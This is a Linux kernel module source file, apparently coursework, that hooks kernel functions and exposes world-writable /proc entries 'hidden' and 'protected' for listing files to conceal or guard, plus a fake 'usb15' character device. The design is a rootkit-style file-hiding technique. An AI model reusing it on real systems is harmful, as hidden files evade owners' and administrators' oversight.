#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/skbuff.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/proc_fs.h>
#include <linux/string.h>

#include "hooked.h"

MODULE_DESCRIPTION("os_course");
MODULE_AUTHOR("Darya Tatarinova");
MODULE_LICENSE("GPL");

#define PROC_FILE_NAME_HIDDEN "hidden"
#define PROC_FILE_NAME_PROTECTED "protected"

char tmp_buffer[MAX_BUF_SIZE];
char hidden_files[100][9];
int hidden_index = 0;
char protected_files[100][9];
int protected_index = 0;

static int my_proc_open(struct inode *sp_inode, struct file *sp_file) 
{
    DMSG("my_proc_open called.\n");
    return 0;
}

static int my_proc_release(struct inode *sp_node, struct file *sp_file) 
{
    DMSG("my_proc_release called.\n");
    return 0;
}

static ssize_t my_proc_write(struct file *file, const char __user *buf, size_t len, loff_t *ppos) 
{
    DMSG("my_proc_write called");

    if (len > MAX_BUF_SIZE - write_index + 1)
    {
        DMSG("buffer overflow");
        return -ENOSPC;
    }

    if (copy_from_user(&buffer[write_index], buf, len) != 0)
    {
        DMSG("copy_from_user fail");
        return -EFAULT;
    }

    write_index += len;
    buffer[write_index - 1] = '\0';

    if (strcmp(file->f_path.dentry->d_iname, PROC_FILE_NAME_HIDDEN) == 0)
    {
        snprintf(hidden_files[hidden_index], len, "%s", &buffer[write_index - len]);
        hidden_index++;
        DMSG("file written to hidden %s", hidden_files[hidden_index - 1]);
    }
    if (strcmp(file->f_path.dentry->d_iname, PROC_FILE_NAME_PROTECTED) == 0)
    {
        snprintf(protected_files[protected_index], len, "%s", &buffer[write_index - len]);
        protected_index++;
        DMSG("file written to protected %s", protected_files[protected_index - 1]);
    }
    else
    {
        DMSG("Unknown file->f_path.dentry->d_iname");
    }
    return len;
}

static ssize_t my_proc_read(struct file *file, char __user *buf, size_t len, loff_t *f_pos) 
{
    DMSG("my_proc_read called.\n");

    if (*f_pos > 0 || write_index == 0)
        return 0;

    if (read_index >= write_index)
        read_index = 0;

    int read_len = snprintf(tmp_buffer, MAX_BUF_SIZE, "%s\n", &buffer[read_index]);
    if (copy_to_user(buf, tmp_buffer, read_len) != 0)
    {
        DMSG("copy_to_user error.\n");
        return -EFAULT;
    }

    read_index += read_len;
    *f_pos += read_len;

    return read_len;
}

static const struct proc_ops fops =
{
    proc_read: my_proc_read,
    proc_write: my_proc_write,
    proc_open: my_proc_open,
    proc_release: my_proc_release,
}; 


static int fh_init(void)
{
    DMSG("call init");

	proc_file_hidden = proc_create(PROC_FILE_NAME_HIDDEN, S_IRUGO | S_IWUGO, NULL, &fops);
  	if (!proc_file_hidden) 
	{
        DMSG("call proc_create_data() fail");
        return -ENOMEM;
    }
    proc_file_protected = proc_create(PROC_FILE_NAME_PROTECTED, S_IRUGO | S_IWUGO, NULL, &fops);
    if (!proc_file_protected) 
	{
        remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
        DMSG("call proc_create_data() fail");
        return -ENOMEM;
    }
	DMSG("proc file created");

    struct device *fake_device;
    int error = 0;
    dev_t devt = 0;

    error = start_hook_resources();
    if (error)
    {
        remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
        remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
        DMSG("Problem in hook functions");
        return error;
    }

    tidy();

    /* Get a range of minor numbers (starting with 0) to work with */
    error = alloc_chrdev_region(&devt, 0, 1, "usb15");

    if (error < 0)
    {
        remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
        remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
        return error;
    }

    major = MAJOR(devt);

    /* Create device class, visible in /sys/class */
    fake_class = class_create(THIS_MODULE, "custom_char_class");

    if (IS_ERR(fake_class)) {
        remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
        remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
        unregister_chrdev_region(MKDEV(major, 0), 1);
        return PTR_ERR(fake_class);
    }

    /* Initialize the char device and tie a file_operations to it */
    cdev_init(&fake_cdev, &fake_fops);
    fake_cdev.owner = THIS_MODULE;
    /* Now make the device live for the users to access */
    cdev_add(&fake_cdev, devt, 1);

    fake_device = device_create(fake_class,
                                NULL,   /* no parent device */
                                devt,    /* associated dev_t */
                                NULL,   /* no additional data */
                                "usb15");  /* device name */

    if (IS_ERR(fake_device))
    {
        remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
        remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
        class_destroy(fake_class);
        unregister_chrdev_region(devt, 1);
        return -1;
    }


    return 0;
}


static void fh_exit(void)
{
    DMSG("call exit");
    
	if (proc_file_hidden) 
	{
		remove_proc_entry(PROC_FILE_NAME_HIDDEN, NULL);
		DMSG("proc file removed (hidden)");
	}

	if (proc_file_protected) 
	{
		remove_proc_entry(PROC_FILE_NAME_PROTECTED, NULL);
		DMSG("proc file removed (prtotected)");
	}

    fh_remove_hooks(demo_hooks, ARRAY_SIZE(demo_hooks));
    unregister_chrdev_region(MKDEV(major, 0), 1);
    device_destroy(fake_class, MKDEV(major, 0));
    cdev_del(&fake_cdev);
    class_destroy(fake_class);
}

module_init(fh_init);
module_exit(fh_exit);
